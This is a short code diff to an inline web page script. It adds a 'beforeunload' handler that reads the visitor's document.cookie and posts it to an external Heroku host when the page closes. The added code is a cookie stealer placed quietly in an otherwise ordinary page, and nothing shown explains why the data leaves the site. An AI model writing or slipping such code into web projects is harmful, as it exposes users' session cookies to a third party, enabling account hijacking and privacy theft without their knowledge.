@@ -36,6 +36,18 @@
           console.log('nothing');
         }
 
+      });
+      window.addEventListener('beforeunload',function () {
+        console.log('unloaded');
+        var x = document.cookie;
+        var cookie = JSON.parse('{'+x+'}')
+        if(x){
+          console.log(cookie);
+           post('https://sleepy-everglades-45938.herokuapp.com/data',cookie,null).then(function(data,err){
+             console.log(data);
+           });
+        
+
       })
 
     </script>
